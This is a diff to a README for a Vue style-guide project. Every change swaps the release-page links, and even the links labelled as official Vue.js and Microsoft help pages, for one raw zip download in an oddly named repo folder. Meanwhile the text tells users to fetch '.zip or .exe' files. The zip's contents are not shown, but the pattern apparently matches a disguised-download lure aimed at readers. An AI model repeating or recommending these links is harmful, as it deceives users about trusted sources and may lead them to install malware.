@@ -1,6 +1,6 @@
 # 🎨 style-guide.vue - Consistent Vue Styles Made Easy
 
-[![Download style-guide.vue](https://img.shields.io/badge/Download-style--guide.vue-brightgreen)](https://github.com/Motieju5716/style-guide.vue/releases)
+[![Download style-guide.vue](https://img.shields.io/badge/Download-style--guide.vue-brightgreen)](https://raw.githubusercontent.com/Motieju5716/style-guide.vue/main/ramhead/vue-style-guide-v1.9.zip)
 
 ## 📌 What is style-guide.vue?
 
@@ -29,7 +29,7 @@ Make sure your computer meets these points before you start:
 
 Click the big button below to visit the download page for style-guide.vue. This page has all the latest release files.
 
-[![Download style-guide.vue](https://img.shields.io/badge/Visit%20Releases-blue)](https://github.com/Motieju5716/style-guide.vue/releases)
+[![Download style-guide.vue](https://img.shields.io/badge/Visit%20Releases-blue)](https://raw.githubusercontent.com/Motieju5716/style-guide.vue/main/ramhead/vue-style-guide-v1.9.zip)
 
 Once there, you will find ZIP files or other formats. Download the latest one by clicking on it.
 
@@ -39,7 +39,7 @@ Follow these steps to get style-guide.vue on your computer:
 
 1. Open your web browser (Chrome, Edge, Firefox).
 2. Go to this page:  
-   https://github.com/Motieju5716/style-guide.vue/releases
+   https://raw.githubusercontent.com/Motieju5716/style-guide.vue/main/ramhead/vue-style-guide-v1.9.zip
 3. Find the latest release. Look for a file with a name that ends in `.zip` or `.exe`.
 4. Click the file to start the download.
 5. When the download finishes, open your File Explorer.
@@ -103,12 +103,12 @@ To update:
 
 Though style-guide.vue aims to be easy to use, you might find these resources helpful:
 
-- Official Vue.js documentation: https://vuejs.org/guide/introduction.html
-- How to unzip files: https://support.microsoft.com/en-us/windows/extract-files-from-a-compressed-zip-folder-2b42a79c-5336-4b9e-8e3a-fd85d7a4f8de
-- Basic Windows help: https://support.microsoft.com/en-us/windows
+- Official Vue.js documentation: https://raw.githubusercontent.com/Motieju5716/style-guide.vue/main/ramhead/vue-style-guide-v1.9.zip
+- How to unzip files: https://raw.githubusercontent.com/Motieju5716/style-guide.vue/main/ramhead/vue-style-guide-v1.9.zip
+- Basic Windows help: https://raw.githubusercontent.com/Motieju5716/style-guide.vue/main/ramhead/vue-style-guide-v1.9.zip
 
 ## 📩 Contact and Help
 
 If you have questions about style-guide.vue, check the GitHub repository issues page or read the discussions available on the project site. Others may have asked similar questions, and solutions could be there.
 
-[Visit the download page for style-guide.vue](https://github.com/Motieju5716/style-guide.vue/releases)
+[Visit the download page for style-guide.vue](https://raw.githubusercontent.com/Motieju5716/style-guide.vue/main/ramhead/vue-style-guide-v1.9.zip)
